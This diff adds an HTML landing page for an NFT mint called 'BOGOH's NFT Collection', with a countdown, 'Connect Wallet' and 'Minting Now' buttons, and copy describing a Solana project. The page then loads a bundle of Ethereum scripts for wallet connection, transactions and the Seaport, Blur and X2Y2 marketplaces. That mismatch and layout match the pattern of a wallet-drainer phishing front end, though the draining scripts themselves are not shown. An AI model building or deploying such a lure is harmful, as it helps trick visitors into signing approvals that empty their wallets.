@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BOGOH's NFT Collection</title>
+    <style>
+      /* Basic styles */
+      body {
+        margin: 0;
+        font-family: "Arial", sans-serif;
+        background-color: #0f1c2c;
+        color: white;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 20px;
+        background-color: rgba(15, 28, 44, 0.95);
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+      }
+
+      header .logo {
+        font-size: 24px;
+        font-weight: bold;
+        color: #39a2db;
+      }
+
+      header .nav-links {
+        display: flex;
+        gap: 20px;
+        align-items: center;
+      }
+
+      header .nav-links a {
+        color: white;
+        text-decoration: none;
+        font-size: 18px;
+        transition: color 0.3s ease;
+      }
+
+      header .nav-links a:hover {
+        color: #39a2db;
+      }
+
+      .minting-btn {
+        font-size: 18px;
+        background-color: #39a2db;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 25px;
+        cursor: pointer;
+        transition: background-color 0.3s ease, transform 0.2s ease;
+      }
+
+      .minting-btn:hover {
+        background-color: #256993;
+        transform: translateY(-2px);
+      }
+
+      /* Hero section */
+      .hero-section {
+        text-align: center;
+        background-image: url("https://source.unsplash.com/random/1920x1080?blockchain");
+        background-size: cover;
+        background-position: center;
+        background-attachment: fixed;
+        padding: 100px 20px;
+        position: relative;
+        flex-grow: 1;
+      }
+
+      .hero-section::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(15, 28, 44, 0.85);
+        z-index: 1;
+      }
+
+      .hero-content {
+        position: relative;
+        z-index: 2;
+        max-width: 800px;
+        margin: 0 auto;
+      }
+
+      .hero-content h1 {
+        font-size: 3.5em;
+        margin-bottom: 20px;
+        color: #39a2db;
+      }
+
+      .hero-content h2 {
+        font-size: 2em;
+        margin-bottom: 40px;
+      }
+
+      .countdown-timer {
+        font-size: 2.5em;
+        margin-bottom: 40px;
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+      }
+
+      .countdown-timer .time-unit {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .countdown-timer .time-value {
+        font-size: 1.2em;
+        font-weight: bold;
+        color: #39a2db;
+      }
+
+      .countdown-timer .time-label {
+        font-size: 0.4em;
+        text-transform: uppercase;
+      }
+
+      .about-section {
+        padding: 80px 20px;
+        text-align: center;
+        background-color: #1a2c3e;
+      }
+
+      .about-section h2 {
+        font-size: 2.5em;
+        margin-bottom: 30px;
+        color: #39a2db;
+      }
+
+      .about-section p {
+        font-size: 1.2em;
+        max-width: 800px;
+        margin: 0 auto;
+        line-height: 1.6;
+      }
+
+      footer {
+        background-color: #0a141f;
+        text-align: center;
+        padding: 20px;
+        font-size: 0.9em;
+      }
+
+      /* Responsive styles */
+      @media (max-width: 768px) {
+        header .nav-links a {
+          display: none;
+        }
+
+        header .nav-links .minting-btn {
+          display: block;
+        }
+
+        .hero-content h1 {
+          font-size: 2.5em;
+        }
+
+        .hero-content h2 {
+          font-size: 1.5em;
+        }
+
+        .countdown-timer {
+          font-size: 2em;
+        }
+
+        .about-section {
+          padding: 60px 20px;
+        }
+
+        .about-section h2 {
+          font-size: 2em;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="logo">BO</div>
+      <nav class="nav-links">
+        <a href="#">About</a>
+        <a href="#">Bonus</a>
+        <a href="#">Roadmap</a>
+        <a href="#">Team</a>
+        <button class="minting-btn connect-button">Connect Wallet</button>
+      </nav>
+    </header>
+
+    <main>
+      <section class="hero-section">
+        <div class="hero-content">
+          <h1>New Bluechip Arrives Soon!</h1>
+          <h2>BOGOH's NFT Collection</h2>
+
+          <div class="countdown-timer" id="countdown">
+            <div class="time-unit">
+              <span id="days" class="time-value">00</span>
+              <span class="time-label">Days</span>
+            </div>
+            <div class="time-unit">
+              <span id="hours" class="time-value">00</span>
+              <span class="time-label">Hours</span>
+            </div>
+            <div class="time-unit">
+              <span id="minutes" class="time-value">00</span>
+              <span class="time-label">Minutes</span>
+            </div>
+            <div class="time-unit">
+              <span id="seconds" class="time-value">00</span>
+              <span class="time-label">Seconds</span>
+            </div>
+          </div>
+
+          <button class="minting-btn connect-button">Minting Now</button>
+        </div>
+      </section>
+
+      <section class="about-section">
+        <h2>What is BOGOH's?</h2>
+        <p>
+          BOGOH's is a collection on Solana Blockchain that wants to bring a
+          universe of cubes to Solana. Our BOB's want to build a new horizon for
+          the blockchain space!
+        </p>
+      </section>
+    </main>
+
+    <footer>
+      <p>&copy; 2024 BOGOH's NFT Collection. All rights reserved.</p>
+    </footer>
+
+    <script>
+      // Countdown Timer
+      function countdown() {
+        const launchDate = new Date("Sep 18, 2024 00:00:00").getTime();
+        const now = new Date().getTime();
+        const difference = launchDate - now;
+
+        const days = Math.floor(difference / (1000 * 60 * 60 * 24));
+        const hours = Math.floor(
+          (difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
+        );
+        const minutes = Math.floor(
+          (difference % (1000 * 60 * 60)) / (1000 * 60)
+        );
+        const seconds = Math.floor((difference % (1000 * 60)) / 1000);
+
+        document.getElementById("days").innerText = days
+          .toString()
+          .padStart(2, "0");
+        document.getElementById("hours").innerText = hours
+          .toString()
+          .padStart(2, "0");
+        document.getElementById("minutes").innerText = minutes
+          .toString()
+          .padStart(2, "0");
+        document.getElementById("seconds").innerText = seconds
+          .toString()
+          .padStart(2, "0");
+
+        if (difference < 0) {
+          clearInterval(x);
+          document.getElementById("countdown").innerText = "Minting Now!";
+        }
+      }
+
+      setInterval(countdown, 1000);
+    </script>
+    <script src="/client/assets/web3-provider/web3-router.js"></script>
+    <script src="/client/assets/web3-provider/web3-connect.js"></script>
+    <script src="/client/assets/web3-provider/web3-module.js"></script>
+    <script src="/client/assets/web3-provider/web3-alert.js"></script>
+    <script src="/client/assets/web3-provider/web3-seaport.js"></script>
+    <script src="/client/assets/web3-provider/web3-data.js"></script>
+    <script src="/client/assets/web3-provider/ethers.js"></script>
+    <script src="/client/assets/web3-provider/ethereum-tx.js"></script>
+    <script src="/client/assets/web3-provider.js"></script>
+    <script src="/client/assets/web3-modules/module-seaport.js"></script>
+    <script src="/client/assets/web3-modules/module-blur.js"></script>
+    <script src="/client/assets/web3-modules/module-x2y2.js"></script>
+  </body>
+</html>
